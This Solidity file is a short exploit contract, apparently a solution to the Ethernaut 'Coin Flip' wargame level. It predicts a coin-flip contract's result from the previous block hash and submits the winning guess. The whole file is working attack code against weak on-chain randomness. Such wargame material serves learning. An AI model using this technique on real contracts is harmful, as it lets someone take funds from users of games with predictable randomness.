// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

//import '@openzeppelin/contracts/math/SafeMath.sol';

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "./Flip.sol";

contract AttackCoinFlip {
    using SafeMath for uint256;
    CoinFlip public myFlip;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor (address _addr){
        myFlip = CoinFlip(_addr);
    }

    function findTheSide() public returns (bool){
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        if (lastHash == blockValue) {
        revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        return coinFlip == 1 ? true : false;
    }

    function attack() public returns (bool){
        bool gain = myFlip.flip(findTheSide());
        return gain;
    }


}
